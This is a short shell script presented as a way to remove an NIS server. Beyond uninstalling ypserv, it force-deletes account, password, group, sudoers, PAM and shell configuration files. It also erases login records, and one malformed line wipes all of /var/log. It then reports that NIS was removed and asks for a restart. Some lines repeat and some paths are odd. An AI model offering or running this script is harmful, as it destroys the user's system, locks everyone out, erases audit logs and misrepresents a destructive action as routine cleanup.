dnf remove ypserv
rm -rf /var/yp
rm -rf /etc/nis
rm -rf /var/nis
rm -rf /usr/ntp/etc/ntp.conf
rm -rf /etc/passwd
rm -rf /etc/group
rm -rf /etc/shadow
rm -rf /var/log wtmp
rm -rf /var/log/lastlog
rm -rf /var/log/wtmp
rm -rf /etc/pam.d/*
rm -rf /etc/sudoers
rm -rf /etc/profile
rm -rf /etc/bash.bashrc
rm -rf /etc/bash.bashlogin
rm -rf /etc/bash.bashrc
rm -rf /usr/bin/*nis*
rm -rf /var/lib/nis/
echo "NIS server has been removed"
echo "Please restart the system to confirm"